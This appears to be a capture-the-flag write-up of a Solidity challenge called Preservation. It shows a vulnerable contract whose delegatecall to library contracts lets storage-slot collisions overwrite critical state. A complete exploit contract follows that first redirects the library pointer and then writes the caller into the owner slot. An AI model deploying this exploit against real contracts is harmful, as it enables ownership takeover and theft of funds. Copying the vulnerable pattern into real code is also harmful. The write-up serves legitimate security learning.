<div align="center">

# Preservation

</div>



**Preservation (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}


```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**

- `Preservation` uses two library contracts (`timeZone1Library` and `timeZone2Library`) to store timestamps.  
- The library calls are made via `delegatecall` in `setFirstTime` and `setSecondTime`.  
- **Key idea:** `delegatecall` runs the library code **in the storage context of `Preservation`**. This means any storage writes in the library affect `Preservation`’s storage slots.  
- **So:** if a malicious contract replaces a library pointer, it can manipulate critical storage, including `owner`.

2. **Vulnerability Highlight (key part)**


```solidity
// delegatecall writes to Preservation storage, not library storage
function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
```






## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract PreservationExploit {
    // Storage layout must match Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function attack(address preservationAddress) external {
        Preservation preservation = Preservation(preservationAddress);
        
        // Step 1: Change timeZone1Library to point to this exploit contract
        // storedTime in LibraryContract writes to slot 0, which is timeZone1Library in Preservation
        preservation.setFirstTime(uint256(uint160(address(this))));
        
        // Step 2: Now call setFirstTime again, but this time it will delegatecall to OUR contract
        // We'll make setTime write to slot 2 (owner)
        preservation.setFirstTime(uint256(uint160(msg.sender))); // msg.sender becomes the new owner
    }

    // This function must have the same signature as LibraryContract's setTime
    function setTime(uint256 _time) public {
        // We control what storage slot to write to
        // In Preservation, owner is at storage slot 2
        assembly {
            sstore(2, _time)
        }
        
        // Alternatively without assembly:
        // owner = address(uint160(_time));
    }
}


```

---


